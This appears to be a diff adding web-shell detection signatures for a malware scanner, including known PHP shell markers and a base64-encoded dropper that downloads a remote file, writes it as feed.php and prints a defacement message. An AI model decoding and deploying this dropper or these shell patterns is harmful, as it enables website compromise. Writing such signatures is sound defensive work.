@@ -1,0 +1,10 @@
+d.fm.p1.value=p1;else d.fm.p1.value=p1_;
+title>HKR1960 Mailer Inbox</title
+default_action = 'FilesMan'
+default_use_ajax = true
+default_charset = 'Windows-1251'
+{ return '127.0.0.1'; }
+?//BREACK//?
+eval\\(base64_decode\\('JGZpbGUgPSBmb3BlbigiZmVlZC5waHAiICwidysiKTsKCiRzYT1maWxlX2dldF9jb250ZW50cygnaHR0cDovL3d3dy4zcmItc2guY29tL3Byb2plY3RzL3Rvby9mZWVkLnR4dCcpOwoKJHdyaXRlID0gZndyaXRlICgkZmlsZSAsJHNhKTsKCmZjbG9zZSgkZmlsZSk7CgppZiAoJHdyaXRlKSB7CgplY2hvICJTZWN1cml0eSBIYXMgQmVlbiBGdWNrZWQgQnkgVW5kZXJUYWtlciI7Cn0KCmVsc2Uge2VjaG8iXCJlcm9yciBcIiI7fQoKY2htb2QoImZlZWQucGhwIiAsIDA3NTUpOw=='\\)\\)
+\\<?php eval \\(gzinflate\\(base64_decode\\(str_rot13\\(
+r = Math.floor\\(Math.random\\(\\) \\* 10000\\);
